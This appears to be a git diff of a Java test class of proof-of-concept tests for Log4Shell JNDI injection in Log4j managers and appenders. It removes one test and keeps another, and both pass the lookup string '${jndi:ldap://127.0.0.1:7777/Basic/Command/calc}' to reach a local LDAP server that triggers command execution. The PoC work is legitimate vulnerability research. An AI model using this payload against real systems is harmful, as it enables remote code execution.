@@ -30,16 +30,5 @@ public class ManagersPocsTests {
         SslSocketManager.getSocketManager(configuration, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", 443, 40000, 20000, false, layout, 1024);
     }
 
-    @Test
-    // Пок не работает в общем случае
-    // В таком исполнении создает и вызывает OutputStreamManager с пустым updateDate()
-    // Для повторения POC необходимо вызвать setTriggerPolicy, который присутствует в RollingFileManager
-    public void createAppenderOutputStreamAppender(){
-        PatternLayout layout = PatternLayout.newBuilder()
-                .withConfiguration(new DefaultConfiguration())
-                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
-                .build();
-        OutputStreamAppender.createAppender(layout, null,  System.out, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, true);
-        OutputStreamAppender.createAppender(layout, null,  System.out, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, true);
-    }
+
 }
